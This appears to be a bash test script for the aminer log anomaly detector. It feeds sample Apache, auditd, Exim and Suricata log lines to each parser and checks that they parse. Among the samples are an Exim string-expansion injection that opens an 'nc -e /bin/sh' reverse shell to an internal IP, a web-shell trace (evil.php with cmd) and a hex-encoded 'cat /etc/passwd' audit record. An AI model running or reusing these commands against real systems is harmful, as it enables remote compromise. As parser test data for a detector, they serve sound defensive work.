#!/bin/bash

exit_code=0

CONFIG_PATH=/tmp/config.yml
OUT=/tmp/output.txt
LOG_FILE=/tmp/log.txt
PATH_AIT_LDS=../source/root/etc/aminer/conf-available/ait-lds/*.py
#PATH_AIT_LDS=/etc/aminer/conf-available/ait-lds/*.py
PATH_GENERIC=../source/root/etc/aminer/conf-available/generic/*.py
#PATH_AIT_LDS=/etc/aminer/conf-available/generic/*.py

cntr=0
files=()

for filename in $PATH_AIT_LDS; do
    files[$cntr]=$filename
    let cntr=cntr+1
done

for filename in $PATH_GENERIC; do
    files[$cntr]=$filename
    let cntr=cntr+1
done

for filename in ${files[@]}; do
    cat > $CONFIG_PATH <<EOL
LearnMode: False
Core.PersistenceDir: '/tmp/lib/aminer'

LogResourceList:
        - 'file://$LOG_FILE'

Input:
        timestamp_paths: ["/accesslog/time"]
        verbose: True

EventHandlers:
        - id: stpe
          type: StreamPrinterEventHandler

Parser:
        - id: 'testingModel'
EOL

    BN=`basename "$filename" .py`
    echo "Testing $BN"
    case $BN in
        ApacheAccessParsingModel)
            echo '83.149.9.216 - - [17/May/2015:10:05:03 +0000] "GET /presentations/logstash-monitorama-2013/images/kibana-search.png HTTP/1.1" 200 203023 "http://semicomplete.com/presentations/logstash-monitorama-2013/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.77 Safari/537.36"' > $LOG_FILE
            echo '::1 - - [17/May/2015:10:05:03 +0000] "-" 200 203023' >> $LOG_FILE
            echo '192.168.10.190 - - [29/Feb/2020:13:58:32 +0000] "GET /services/portal/ HTTP/1.1" 200 7499 "-" "-"' >> $LOG_FILE
            ;;
        ApacheErrorParsingModel)
            echo '[Sun Mar 01 06:28:15.983231 2020] [:error] [pid 32548] [client 192.168.10.4:55308] PHP Warning:  Declaration of Horde_Form_Type_pgp::init($gpg, $temp_dir = NULL, $rows = NULL, $cols = NULL) should be compatible with Horde_Form_Type_longtext::init($rows = 8, $cols = 80, $helper = Array) in /usr/share/php/Horde/Form/Type.php on line 878, referer: http://mail.cup.com/nag/' > $LOG_FILE
            echo "[Sun Mar 01 06:28:15.983231 2020] [:error] [pid 32548] [client 192.168.10.4:55308] PHP Warning:  system(): Cannot execute a blank command in words.php on line 12" > $LOG_FILE
            echo "[Wed Mar 04 19:32:45.144442 2020] [:error] [pid 8738] [client 192.168.10.238:60488] PHP Notice:  Undefined index: cmd in /var/www/mail.cup.com/static/evil.php on line 1" >> $LOG_FILE
            echo "[Wed Mar 04 06:26:43.756548 2020] [:error] [pid 22069] [client 192.168.10.190:33604] PHP Deprecated:  Methods with the same name as their class will not be constructors in a future version of PHP; Horde_Form_Variable has a deprecated constructor in /usr/share/php/Horde/Form/Variable.php on line 24, referer: http://mail.cup.com/nag/" >> $LOG_FILE
            ;;
        AuditdParsingModel)
            echo 'type=EXECVE msg=audit(1582934957.620:917519): argc=10 a0="find" a1="/usr/lib/php" a2="-mindepth" a3="1" a4="-maxdepth" a5="1" a6="-regex" a7=".*[0-9]\.[0-9]" a8="-printf" a9="%f\n"' > $LOG_FILE
            echo 'type=PROCTITLE msg=audit(1582934957.616:917512): proctitle=736F7274002D726E' >> $LOG_FILE
            echo 'type=SYSCALL msg=audit(1582934957.616:917513): arch=c000003e syscall=2 success=yes exit=3 a0=7f5b904e4988 a1=80000 a2=1 a3=7f5b906ec518 items=1 ppid=25680 pid=25684 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="sort" exe="/usr/bin/sort" key=(null)' >> $LOG_FILE
            echo 'type=PATH msg=audit(1582934957.616:917512): item=0 name="/usr/bin/sort" inode=2883 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL' >> $LOG_FILE
            echo 'type=LOGIN msg=audit(1582935421.373:947570): pid=25821 uid=0 old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=22 res=1' >> $LOG_FILE
            echo "type=SOCKADDR msg=audit(1582935421.377:947594): saddr=01002F6465762F6C6F6700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" >> $LOG_FILE
            echo "type=UNKNOWN[1327] msg=audit(1522927552.749:917): proctitle=636174002F6574632F706173737764" >> $LOG_FILE
            echo 'type=CRED_REFR msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
            echo 'type=USER_START msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
            echo 'type=USER_ACCT msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
            echo 'type=USER_AUTH msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
            echo 'type=CRED_DISP msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
            echo 'type=SERVICE_START msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
            echo 'type=SERVICE_STOP msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
            echo 'type=USER_END msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
            echo 'type=USER_CMD msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
            echo 'type=CRED_ACQ msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
            echo 'type=BPRM_FCAPS msg=audit(1583242318.512:13886958): fver=17474 fp=33 fi=4294967295 fe=4294967295 old_pp=message old_pi="apache2" old_pe="/usr/bin/bash" new_pp=(null) new_pi=(null) new_pe=(null)' >> $LOG_FILE
            ;;
        EximParsingModel)
            echo "2020-02-29 00:04:25 Start queue run: pid=31912" > $LOG_FILE
            echo "2020-02-29 00:34:25 End queue run: pid=32425" >> $LOG_FILE
            echo "2020-03-04 19:17:34 no host name found for IP address 192.168.10.238" >> $LOG_FILE
            echo "2020-03-04 19:21:48 VRFY failed for boyce@cup.com H=(x) [192.168.10.238]" >> $LOG_FILE
            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi <= trula@mail.cup.com U=www-data P=local S=8714 id=20200304192508.Horde.g3OQpszuommgdrQpHrx6wIc@mail.cup.com" >> $LOG_FILE
            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi => irwin <irwin@mail.cup.com> R=local_user T=mail_spool" >> $LOG_FILE
            echo '2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W ** ${run{\x2fbin\x2fsh\t-c\t\x22nc\t-e\t\x2fbin\x2fsh\t192.168.10.238\t9963\x22}}@localhost: Too many "Received" headers - suspected mail loop' >> $LOG_FILE
            echo "2020-03-04 19:36:57 1j9ZpB-0002KN-QF Completed" >> $LOG_FILE
            echo "2020-03-04 20:04:25 1j9ZoZ-0002Jk-9W Message is frozen" >> $LOG_FILE
            echo "2020-03-04 19:38:19 1j9ZoZ-0002Jk-9W Frozen (delivery error message)" >> $LOG_FILE
            ;;
        SuricataEventParsingModel)
            echo '{"timestamp":"2020-02-29T00:00:12.734324+0000","flow_id":914989792375924,"in_iface":"eth0","event_type":"dns","src_ip":"192.168.10.154","src_port":53985,"dest_ip":"10.18.255.254","dest_port":53,"proto":"UDP","dns":{"type":"query","id":30266,"rrname":"190.10.168.192.in-addr.arpa","rrtype":"PTR","tx_id":0}}' > $LOG_FILE
            echo '{"timestamp":"2020-02-29T00:00:14.000538+0000","flow_id":1357371404246463,"event_type":"flow","src_ip":"192.168.10.154","src_port":46289,"dest_ip":"10.18.255.254","dest_port":53,"proto":"UDP","app_proto":"dns","flow":{"pkts_toserver":1,"pkts_toclient":1,"bytes_toserver":87,"bytes_toclient":142,"start":"2020-02-28T23:55:12.974271+0000","end":"2020-02-28T23:55:13.085657+0000","age":1,"state":"established","reason":"timeout","alerted":false}}' >> $LOG_FILE
            echo '{"timestamp":"2020-02-29T00:00:14.886252+0000","flow_id":149665274984610,"in_iface":"eth0","event_type":"http","src_ip":"192.168.10.190","src_port":39438,"dest_ip":"192.168.10.154","dest_port":80,"proto":"TCP","tx_id":1,"http":{"hostname":"mail.cup.com","url":"\/services\/portal\/","http_user_agent":"Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko\/20100101 Firefox\/73.0","http_content_type":"text\/html","http_refer":"http:\/\/mail.cup.com\/login.php","http_method":"GET","protocol":"HTTP\/1.1","status":200,"length":7326}}' >> $LOG_FILE
            echo '{"timestamp":"2020-02-29T00:00:14.977952+0000","flow_id":149665274984610,"in_iface":"eth0","event_type":"fileinfo","src_ip":"192.168.10.154","src_port":80,"dest_ip":"192.168.10.190","dest_port":39438,"proto":"TCP","http":{"hostname":"mail.cup.com","url":"\/services\/portal\/","http_user_agent":"Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko\/20100101 Firefox\/73.0","http_content_type":"text\/html","http_refer":"http:\/\/mail.cup.com\/login.php","http_method":"GET","protocol":"HTTP\/1.1","status":200,"length":7326},"app_proto":"http","fileinfo":{"filename":"\/services\/portal\/","state":"CLOSED","stored":false,"size":41080,"tx_id":1}}' >> $LOG_FILE
            echo '{"timestamp":"2020-02-29T00:00:18.000491+0000","event_type":"stats","stats":{"uptime":17705,"capture":{"kernel_packets":337720,"kernel_drops":0},"decoder":{"pkts":337749,"bytes":229373623,"invalid":3062,"ipv4":335528,"ipv6":10,"ethernet":337749,"raw":0,"null":0,"sll":0,"tcp":317611,"udp":14805,"sctp":0,"icmpv4":50,"icmpv6":10,"ppp":0,"pppoe":0,"gre":0,"vlan":0,"vlan_qinq":0,"teredo":0,"ipv4_in_ipv6":0,"ipv6_in_ipv6":0,"mpls":0,"avg_pkt_size":679,"max_pkt_size":1486,"erspan":0,"ipraw":{"invalid_ip_version":0},"ltnull":{"pkt_too_small":0,"unsupported_type":0},"dce":{"pkt_too_small":0}},"flow":{"memcap":0,"spare":10001,"emerg_mode_entered":0,"emerg_mode_over":0,"tcp_reuse":0,"memuse":7104256},"defrag":{"ipv4":{"fragments":0,"reassembled":0,"timeouts":0},"ipv6":{"fragments":0,"reassembled":0,"timeouts":0},"max_frag_hits":0},"tcp":{"sessions":7155,"ssn_memcap_drop":0,"pseudo":1082,"pseudo_failed":0,"invalid_checksum":0,"no_flow":0,"syn":7418,"synack":7307,"rst":3226,"segment_memcap_drop":0,"stream_depth_reached":0,"reassembly_gap":375,"memuse":819200,"reassembly_memuse":12281632},"detect":{"alert":58},"app_layer":{"flow":{"http":4883,"ftp":0,"smtp":0,"tls":1564,"ssh":0,"imap":0,"msn":0,"smb":0,"dcerpc_tcp":0,"dns_tcp":0,"failed_tcp":258,"dcerpc_udp":0,"dns_udp":6951,"failed_udp":119},"tx":{"http":13248,"smtp":0,"tls":0,"dns_tcp":0,"dns_udp":7185}},"flow_mgr":{"closed_pruned":7112,"new_pruned":21,"est_pruned":6999,"bypassed_pruned":0,"flows_checked":1,"flows_notimeout":0,"flows_timeout":1,"flows_timeout_inuse":0,"flows_removed":1,"rows_checked":65536,"rows_skipped":65535,"rows_empty":0,"rows_busy":0,"rows_maxlen":1},"dns":{"memuse":24462,"memcap_state":0,"memcap_global":0},"http":{"memuse":61601,"memcap":0}}}' >> $LOG_FILE
            echo '{"timestamp":"2020-02-29T00:01:53.976648+0000","flow_id":378741657290945,"in_iface":"eth0","event_type":"tls","src_ip":"192.168.10.238","src_port":53156,"dest_ip":"192.168.10.154","dest_port":443,"proto":"TCP","tls":{"subject":"CN=mail.cup.com","issuerdn":"CN=ChangeMe","fingerprint":"12:7a:88:ea:52:10:62:44:f0:c5:33:8a:28:2d:ad:12:a1:4e:7e:18","sni":"mail.cup.com","version":"TLS 1.2","notbefore":"2020-02-28T18:40:23","notafter":"2030-02-25T18:40:23"}}' >> $LOG_FILE
            echo '{"timestamp":"2020-02-29T06:11:02.147044+0000","flow_id":415686269975930,"in_iface":"eth0","event_type":"alert","src_ip":"192.168.10.238","src_port":50850,"dest_ip":"192.168.10.154","dest_port":80,"proto":"TCP","tx_id":0,"alert":{"action":"allowed","gid":1,"signature_id":2012887,"rev":3,"signature":"ET POLICY Http Client Body contains pass= in cleartext","category":"Potential Corporate Privacy Violation","severity":1},"http":{"hostname":"mail.cup.com","url":"\/login.php","http_user_agent":"Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko\/20100101 Firefox\/73.0","http_content_type":"text\/html","http_refer":"http:\/\/mail.cup.com\/login.php","http_method":"POST","protocol":"HTTP\/1.1","status":302,"redirect":"\/services\/portal\/","length":20}}' >> $LOG_FILE
            ;;
        SuricataFastParsingModel)
            exit 0
            echo "test6" > $LOG_FILE
            ;;
        SyslogParsingModel)
            echo "test7" > $LOG_FILE
            ;;
        AminerParsingModel)
            echo "test8" > $LOG_FILE
            ;;
        ApacheAccessModel)
            echo '83.149.9.216 - - [17/May/2015:10:05:03 +0000] "GET /presentations/logstash-monitorama-2013/images/kibana-search.png HTTP/1.1" 200 203023 "http://semicomplete.com/presentations/logstash-monitorama-2013/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.77 Safari/537.36"' > $LOG_FILE
            echo '::1 - - [17/May/2015:10:05:03 +0000] "-" 200 203023' >> $LOG_FILE
            echo '192.168.10.190 - - [29/Feb/2020:13:58:32 +0000] "GET /services/portal/ HTTP/1.1" 200 7499 "-" "-"' >> $LOG_FILE
            ;;
        AudispdParsingModel)
            echo "test10" > $LOG_FILE
            ;;
        CronParsingModel)
            echo "test11" > $LOG_FILE
            ;;
        EximGenericParsingModel)
            echo "test12" > $LOG_FILE
            ;;
        KernelMsgParsingModel)
            echo "test13" > $LOG_FILE
            ;;
        NtpParsingModel)
            echo "test14" > $LOG_FILE
            ;;
        RsyslogParsingModel)
            echo "test15" > $LOG_FILE
            ;;
        SshdParsingModel)
            echo "test16" > $LOG_FILE
            ;;
        SsmtpParsingModel)
            echo "test17" > $LOG_FILE
            ;;
        SuSessionParsingModel)
            echo "test18" > $LOG_FILE
            ;;
        SyslogPreambleModel)
            echo "test19" > $LOG_FILE
            ;;
        SystemdParsingModel)
            echo "test20" > $LOG_FILE
            ;;
        TomcatParsingModel)
            echo "test21" > $LOG_FILE
            ;;
        UlogdParsingModel)
            echo "test22" > $LOG_FILE
            ;;
        *)
            echo "Unknown parser config was found! Please extend these tests. Failing.."
            exit_code=2
            continue
            ;;
    esac

    cat >> $CONFIG_PATH <<EOL
          type: $BN
          name: 'testedModel'

        - id: 'startModel'
          start: True
          type: SequenceModelElement
          name: 'model'
          args:
            - testingModel
EOL

    sudo aminer -C -c $CONFIG_PATH > $OUT 2>&1 &
    #stop aminer
    sleep 3 & wait $!
    sudo pkill -x aminer
    KILL_PID=$!
    sleep 2
    wait $KILL_PID

    #cat $OUT

    if `grep -Fq "VerboseUnparsedAtomHandler" $OUT` || `grep -Fq "Traceback" $OUT` || `grep -Fq "{'Parser'" $OUT`; then
        echo "Failed Test in $filename"
	    exit_code=1
	    cat $OUT
	    echo
	    echo
    fi
done

rm $CONFIG_PATH
exit $exit_code
